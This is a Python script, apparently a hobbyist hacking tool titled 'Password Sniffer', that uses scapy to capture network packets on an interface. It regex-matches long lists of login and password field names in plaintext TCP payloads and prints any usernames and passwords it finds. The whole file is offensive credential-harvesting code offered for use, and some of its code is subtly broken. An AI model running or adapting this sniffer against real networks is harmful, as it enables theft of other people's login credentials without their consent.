from scapy.all import *
from urllib import parse
import re
from termcolor import colored
c = colored

print(c("             _____                    _  __  __  ", "red"))
print(c("            |  __ \                  (_)/ _|/ _| ", "red"))
print(c("            | |__) |_ _ ___ ___ _ __  _| |_| |_  ", "red"))
print(c("            |  ___/ _` / __/ __| '_ \| |  _|  _| ", "red"))
print(c("            | |  | (_| \__ \__ \ | | | | | | |   ", "red"))
print(c("            |_|   \__,_|___/___/_| |_|_|_| |_|   ", "red"))
print(" <<<<<----->= Password Sniffer By: IAmFalseBeliefs <=----->>>>>")
print("        <<<<<----->= Passwords made easy <=----->>>>>")

#iface = input("[----] Enter the Web Interface you have as defualt (ie. eth0; wlan0): ")
iface = "eth0"

def get_login_pass(body):
	user = None
	passwd = None

	userfields = ["log", "login", "wpname", "ahd_username", "unickname", "nickname", "user", "alias", "pseudo", "email", "username", "fuserid", "form_loginname", "login_id", "loginid", "session_key", "sessionkey", "pop_login", "uid", "id", "uname", "ulogin", "acctname", "account", "member", "mailaddress", "membername", "login_email", "loginusername", "loginemail", "uin", "sign-in", "usuario"]
	passfields = ["ahd_password", "pass", "password", "passwd", "_password", "session_password", "login_password", "loginpassword", "form_pw", "pw", "userpassword", "user_password", "passwort", "upasswd", "senha", "wppassword", "constrasena"]

	for login in userfields:
		login_re = re.search("(%s=[^&]+)" % login, body, re.IGNORECASE)
		if login_re:
			user = login_re.group()
	for passfield in passfields:
		pass_re = re.search("(%s=[^&]+)" % passfield, body, re.IGNORECASE)
		if pass_re:
			passwd = pass_re.group()

		if user and passwd:
			return(user, passwd)

def pkt_parser(packet):
	if packet.haslayer(TCP) and packet.haslayer(str(Raw)) and packet.haslayer(IP):
		body = str(packet[TCP].payload)
		user_pass = get_login_pass(body)
		if user_pass != None:
			print(c("[----] Website Login: " + packet[TCP].payload, "green"))
			print(c("[----] Username Found: " + parse.unquote(user_pass[0]), "green"))
			print(c("[----] Password Found: " + parse.unquote(user_pass[1]), "green"))
	else:
		pass

try:
	sniff(iface = iface, prn = pkt_parser, store = 0)
except KeyboardInterrupt:
	print(c("[----] Exiting", "red"))
	exit(0)
